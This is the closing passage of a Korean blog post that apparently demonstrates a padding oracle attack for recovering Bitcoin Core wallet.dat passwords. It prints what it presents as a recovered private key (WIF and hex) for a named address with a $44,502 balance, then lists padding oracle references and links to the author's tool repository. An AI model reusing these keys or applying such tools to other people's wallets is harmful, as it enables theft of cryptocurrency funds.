<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-109-1024x801.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4223"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Private key WIF: KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
Public key: 02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f
Address: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
Hash160: 7774801e52a110aba2d65ecc58daf0cfec95a09f

--------------------------------------

The message to sign: CryptoDeepTech
The signature is: ILPeG1ThZ0XUXz3iPvd0Q6ObUTF7SxmnhUK2q0ImEeepcZ00npIRqMWOLEfWSJTKd1g56CsRFa/xI/fRUQVi19Q=
The signature is valid!</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>좋아요!&nbsp;개인 키는 비트코인 ​​지갑에 해당합니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">비트 주소를</a></strong>&nbsp;열고&nbsp;&nbsp;&nbsp;확인해 봅시다:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
WIF:  KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
HEX:  3A32D38E814198CC8DD20B49752615A835D67041C4EC94489A61365D9B6AD330</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4225} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-110.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4225"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4226} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-111.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4226"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4227} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-112.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4227"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4228} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-113-1024x146.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4228"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><code>BALANCE: $ 44502.42</code></strong></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">참고자료:</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>[1]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_Juliano_Rizzo_Thai_Duong.pdf" target="_blank" rel="noreferrer noopener">실용적인 패딩 오라클 공격&nbsp;<strong>(Juliano Rizzo Thai Duong) [2010]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[2]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Efficient_Padding_Oracle_Attacks_on_Cryptographic_Hardware_Romain_Bardou_Riccardo_Focardi_Yusuke_Kawamoto_Lorenzo_Simionato_Graham_Steel__Joe_Kai_Tsay.pdf" target="_blank" rel="noreferrer noopener">암호화 하드웨어에 대한 효율적인 패딩 Oracle 공격&nbsp;<strong>(Romain Bardou, Riccardo Focardi, Yusuke Kawamoto, Lorenzo Simionato, Graham Steel, Joe-Kai Tsay)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[3]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">SSL, IPSEC, WTLS에 대한 CBC 패딩 애플리케이션으로 인한 보안 결함&nbsp;</a></em><strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">… (Serge Vaudenay)</a></em></strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[4]&nbsp;</strong><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_on_PKCS_Can_Non_standard_Implementation_Act_as_a_Shelter_Si_Gao_Hua_Chen_and_Limin_Fan.pdf" target="_blank" rel="noreferrer noopener"><em>PKCS#1 v1.5에 대한 패딩 Oracle 공격: 비표준 구현이 대피소 역할을 할 수 있음&nbsp;<strong>(Si Gao, Hua Chen 및 Limin Fan)</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[5]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Attacks_and_Defenses_Dr_Falko_Strenzke.pdf" target="_blank" rel="noreferrer noopener">공격과 방어&nbsp;<strong>(Falko Strenzke 박사) [2020]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[6]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/CBC_padding_oracle_attacks.pdf" target="_blank" rel="noreferrer noopener">CBC 패딩 오라클 공격&nbsp;<strong>[2023]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[7]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Fun_with_Padding_Oracles_Justin_Clarke_OWASP_London_Chapter.pdf" target="_blank" rel="noreferrer noopener">패딩 오라클과 함께하는 즐거움&nbsp;<strong>(저스틴 클라크) [OWASP 런던 장]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[8]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_on_RSA_Riccardo_Focardi.pdf" target="_blank" rel="noreferrer noopener">RSA에 대한 실제 패딩 Oracle 공격&nbsp;<strong>(Riccardo Focardi)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[9]&nbsp;</strong><a href="https://cryptodeep.ru/doc/The_Padding_Oracle_Attack_Fionn_Fitzmaurice_2018.pdf" target="_blank" rel="noreferrer noopener"><em>패딩 오라클 공격&nbsp;<strong>(Fionn Fitzmaurice) [2018]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[10]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Exploiting_CBC_Padding_Oracles_Eli_Sohl_2021.pdf" target="_blank" rel="noreferrer noopener">CBC 패딩 오라클&nbsp;<strong>Eli Sohl 악용 [2021]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;11&nbsp;]&nbsp;</strong><a href="https://cryptodeep.ru/doc/Partitioning_Oracle_Attacks_Julia_Len_Paul_Grubbs_Thomas_Ristenpart_Cornell_Tech.pdf" target="_blank" rel="noreferrer noopener"><em>Oracle 공격 분할&nbsp;<strong>(Julia Len, Paul Grubbs, Thomas Ristenpart) [Cornell Tech]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;12&nbsp;]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Padding_and_CBC_Mode_y_David_Wagner_and_Bruce_Schneider_1997.pdf" target="_blank" rel="noreferrer noopener">패딩 및 CBC 모드&nbsp;<strong>(David Wagner 및 Bruce Schneider) [1997]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;13&nbsp;]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attacks_methodology.pdf" target="_blank" rel="noreferrer noopener">Oracle 공격 패딩&nbsp;<strong>(방법론)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;14&nbsp;]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_Introduction_Packet_Encryption_Mode_CTF_Events.pdf" target="_blank" rel="noreferrer noopener">Padding Oracle 공격&nbsp;<strong>(도입 패킷 암호화 모드 CTF 이벤트)</strong></a></em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">이 자료는 BITCOIN</a>&nbsp;암호화폐 &nbsp;의&nbsp; 약한&nbsp;<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;&nbsp;서명&nbsp; 에 대해&nbsp;&nbsp;데이터 및 타원 곡선 암호화&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1 의 금융 보안을 보장하기 위해&nbsp;</a><a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>&nbsp;포털용 으로 제작되었습니다&nbsp;&nbsp;.&nbsp;소프트웨어 제작자는 자료 사용에 대해 책임을 지지 않습니다.<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener"></a><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">원천</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">텔레그램: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/0aCfT-kCRlw" target="_blank" rel="noreferrer noopener">영상자료 : https://youtu.be/0aCfT-kCRlw</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/padding-oracle-attack-on-wallet-dat" target="_blank" rel="noreferrer noopener">출처: https://cryptodeep.ru/padding-oracle-attack-on-wallet-dat</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4252} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/048-1024x576.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4252"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">암호분석</a></p>
<!-- /wp:paragraph -->
